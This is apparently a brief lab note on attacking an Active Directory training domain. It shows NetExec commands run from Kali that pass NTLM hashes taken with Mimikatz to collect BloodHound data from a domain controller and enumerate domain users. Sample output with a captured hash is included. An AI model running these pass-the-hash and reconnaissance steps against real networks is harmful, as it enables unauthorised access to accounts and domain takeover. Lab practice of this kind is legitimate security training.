From Kali, run the follwing against your Windows Domain Controller Target:
We will be using NetExecute for this using the username and NTML HAShes you got from Mimikatz
```
nxc ldap <domain-controler-IP> -u <username> -H '<NTLM-HASH>' --bloodhound --collection DCOnly --dns-server <domain-controler-IP> --dns-tcp --dns-timeout 10

```
-u => Username
-p => password
-H => NTLM HASH
If you are using proxy chains, you need to add the following:
--dns-tcp --dns-timeout 10

Example:
```
nxc ldap 10.2.10.11 -u sql_svc -H 84a5092f53390ea48d660be52b93b804 --bloodhound --collection DCOnly --dns-server 10.2.10.11 --dns-tcp --dns-timeout 10
```

Example output:
```
┌──(digit㉿kali)-[~/Documents/Labs/GO-AD]
└─$ nxc ldap 10.2.10.12 -u sql_svc -H 84a5092f53390ea48d660be52b93b804 --bloodhound --collection DCOnly                                         
LDAP        10.2.10.12      389    MEEREEN          [*] Windows 10 / Server 2016 Build 14393 (name:MEEREEN) (domain:essos.local) (signing:None) (channel binding:Never) 
LDAP        10.2.10.12      389    MEEREEN          [+] essos.local\sql_svc:84a5092f53390ea48d660be52b93b804 
LDAP        10.2.10.12      389    MEEREEN          Resolved collection methods: trusts, group, objectprops, container, acl
LDAP        10.2.10.12      389    MEEREEN          [-] Could not find a domain controller. Consider specifying a domain and/or DNS server.

```

# Enumerate Domain Users

To enumerate all users via LDAP:
```
nxc ldap $ip -u $user -p $password --users
```

To export all users to a file:
```
nxc ldap $ip -u $user -p $password --users-export output.txt
```

To enumerate just the active users via LDAP:
```
nxc ldap $ip -u $user -p $password --active-users
```